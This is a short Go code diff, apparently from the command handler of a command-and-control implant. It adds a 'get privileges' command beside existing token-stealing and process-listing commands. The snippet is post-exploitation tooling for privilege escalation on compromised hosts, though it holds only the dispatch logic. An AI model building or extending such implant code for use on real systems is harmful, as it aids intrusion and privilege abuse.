@@ -115,6 +115,9 @@ func main() {
 							case packet.CMD_TYPE_STEAL_TOKEN:
 								Token, result, err = services.CmdStealToken(cmdBuf)
 								callbackType = 0
+							case packet.CMD_TYPE_GET_PRIVS:
+								result, err = services.CmdGetPrivs(cmdBuf, Token)
+								callbackType = 0
 							case packet.CMD_TYPE_PS:
 								result, err = services.CmdPs(cmdBuf)
 								resultType := packet.ReadInt(cmdBuf)
